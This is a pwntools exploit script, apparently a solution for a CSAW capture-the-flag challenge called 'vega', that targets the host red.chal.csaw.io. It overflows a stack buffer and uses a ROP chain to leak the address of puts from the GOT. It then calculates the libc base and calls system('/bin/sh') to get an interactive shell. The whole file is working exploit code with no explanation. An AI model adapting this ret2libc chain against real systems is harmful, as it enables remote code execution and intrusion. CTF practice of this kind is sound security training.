from pwn import *

e = ELF("./vega")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("red.chal.csaw.io", 5011)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

p1 = 0x08048b56
debug()
p.sendlineafter("overlord.", "A" * 0x70 + p32(e.symbols["puts"]) + p32(p1) + p32(e.got["puts"]) + p32(p1 + 1) + p32(0x8048aa6))

p.recvline()
p.recvline()
leak = ""
for i in range(4):
  leak += p.recv(1)
leak = u32(leak) - libc.symbols["puts"]
print(hex(leak))

p.sendlineafter("overlord.", "A" * 0x70 + p32(p1 + 1) + p32(leak + libc.symbols["system"]) + p32(p1) + p32(leak + next(libc.search("/bin/sh"))) + p32(0x8048aa6))


p.interactive()
